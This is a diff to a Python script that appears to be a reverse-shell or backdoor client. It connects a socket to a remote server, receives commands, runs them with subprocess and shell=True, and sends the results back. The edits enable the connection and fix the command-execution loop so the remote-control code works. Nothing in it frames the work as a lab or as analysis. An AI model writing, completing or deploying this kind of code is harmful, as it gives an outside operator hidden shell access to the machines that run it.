@@ -22,12 +22,12 @@ sleep_sec = 10
 # Create a socket to connect to the server
 connection_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 connection_socket.settimeout(CONNECTION_TIMEOUT)
-# connection_socket.connect(ADDRESS)
+connection_socket.connect(ADDRESS)
 
 # Determine if the connection is live
 def is_socket_connected():
     try:
-        unix_exit_code = socket.getsockopt(socket.SOL_SOCKET, socket.SO_ERROR)
+        unix_exit_code = connection_socket.getsockopt(socket.SOL_SOCKET, socket.SO_ERROR)
         print(unix_exit_code)
         return True if unix_exit_code == 0 else False
     except socket.error as e:
@@ -47,6 +47,8 @@ def sleep_or_connect():
             # time.sleep(sleep_sec)
 
 sleep_or_connect()
+# def receive_or_connect():
+
 
 # Receive the debug message
 message = connection_socket.recv(config.PAYLOAD_SIZE).decode()
@@ -63,6 +65,7 @@ while True:
         sleep_or_connect()
         continue
     # Execute the command
-    shell_output = subprocess.getoutput(decrypted_command)
+    shell_output = subprocess.check_output(decrypted_command, shell=True)
     # Send the results to the server
-    connection_socket.send(shell_output)
+    encrypted_output = shell_output
+    connection_socket.send(encrypted_output)
